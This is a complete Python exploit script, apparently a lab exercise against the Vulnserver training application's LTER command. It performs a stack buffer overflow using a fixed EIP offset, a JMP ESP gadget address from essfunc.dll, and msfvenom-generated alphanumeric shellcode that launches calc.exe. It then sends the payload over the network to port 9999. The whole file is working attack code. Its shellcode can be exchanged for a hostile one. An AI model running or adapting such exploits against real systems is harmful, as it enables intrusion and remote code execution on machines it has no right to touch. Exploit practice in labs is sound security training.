#!/usr/bin/python3
from pwn import remote, p32

prefix = b"LTER ."

# !py mona pattern_offset eip
offset = 2006
junk = b"A" * offset

# !py mona jmp -r esp -m essfunc.dll
jmpesp = p32(0x62501203)

# msfvenom -p windows/exec CMD=calc.exe BufferRegister=ESP -f python -v shellcode -b '\x00' -e x86/alpha_mixed
shellcode =  b""
shellcode += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x69"
shellcode += b"\x78\x6b\x32\x77\x70\x63\x30\x55\x50\x43\x50"
shellcode += b"\x4c\x49\x69\x75\x66\x51\x6b\x70\x32\x44\x6e"
shellcode += b"\x6b\x56\x30\x54\x70\x6e\x6b\x66\x32\x66\x6c"
shellcode += b"\x6e\x6b\x36\x32\x56\x74\x4e\x6b\x50\x72\x74"
shellcode += b"\x68\x44\x4f\x6f\x47\x50\x4a\x56\x46\x56\x51"
shellcode += b"\x79\x6f\x4e\x4c\x37\x4c\x53\x51\x51\x6c\x45"
shellcode += b"\x52\x54\x6c\x75\x70\x7a\x61\x38\x4f\x66\x6d"
shellcode += b"\x53\x31\x6b\x77\x6b\x52\x4a\x52\x63\x62\x46"
shellcode += b"\x37\x4c\x4b\x33\x62\x56\x70\x4c\x4b\x50\x4a"
shellcode += b"\x75\x6c\x6c\x4b\x52\x6c\x56\x71\x64\x38\x48"
shellcode += b"\x63\x47\x38\x35\x51\x78\x51\x63\x61\x4c\x4b"
shellcode += b"\x73\x69\x35\x70\x57\x71\x39\x43\x4c\x4b\x50"
shellcode += b"\x49\x72\x38\x48\x63\x55\x6a\x73\x79\x6e\x6b"
shellcode += b"\x50\x34\x4e\x6b\x55\x51\x4b\x66\x30\x31\x49"
shellcode += b"\x6f\x4e\x4c\x39\x51\x4a\x6f\x54\x4d\x63\x31"
shellcode += b"\x79\x57\x66\x58\x4d\x30\x31\x65\x5a\x56\x53"
shellcode += b"\x33\x63\x4d\x38\x78\x35\x6b\x51\x6d\x57\x54"
shellcode += b"\x74\x35\x79\x74\x70\x58\x4c\x4b\x61\x48\x54"
shellcode += b"\x64\x56\x61\x6e\x33\x30\x66\x6e\x6b\x56\x6c"
shellcode += b"\x42\x6b\x4e\x6b\x70\x58\x37\x6c\x37\x71\x69"
shellcode += b"\x43\x6c\x4b\x36\x64\x6e\x6b\x65\x51\x7a\x70"
shellcode += b"\x4f\x79\x52\x64\x77\x54\x36\x44\x31\x4b\x51"
shellcode += b"\x4b\x51\x71\x76\x39\x31\x4a\x42\x71\x6b\x4f"
shellcode += b"\x39\x70\x61\x4f\x61\x4f\x51\x4a\x6c\x4b\x57"
shellcode += b"\x62\x78\x6b\x6e\x6d\x71\x4d\x70\x6a\x46\x61"
shellcode += b"\x4c\x4d\x6c\x45\x4c\x72\x45\x50\x53\x30\x57"
shellcode += b"\x70\x70\x50\x42\x48\x76\x51\x4e\x6b\x30\x6f"
shellcode += b"\x6d\x57\x49\x6f\x6e\x35\x6d\x6b\x58\x70\x4e"
shellcode += b"\x55\x4f\x52\x43\x66\x51\x78\x4c\x66\x6a\x35"
shellcode += b"\x4d\x6d\x6f\x6d\x79\x6f\x4e\x35\x75\x6c\x74"
shellcode += b"\x46\x53\x4c\x46\x6a\x6b\x30\x59\x6b\x6d\x30"
shellcode += b"\x32\x55\x34\x45\x6d\x6b\x77\x37\x66\x73\x30"
shellcode += b"\x72\x70\x6f\x43\x5a\x35\x50\x52\x73\x79\x6f"
shellcode += b"\x6b\x65\x72\x43\x73\x51\x32\x4c\x52\x43\x64"
shellcode += b"\x6e\x53\x55\x51\x68\x53\x55\x67\x70\x41\x41"

payload = prefix + junk + jmpesp + shellcode

shell = remote("Windows", 9999)
shell.sendline(payload)
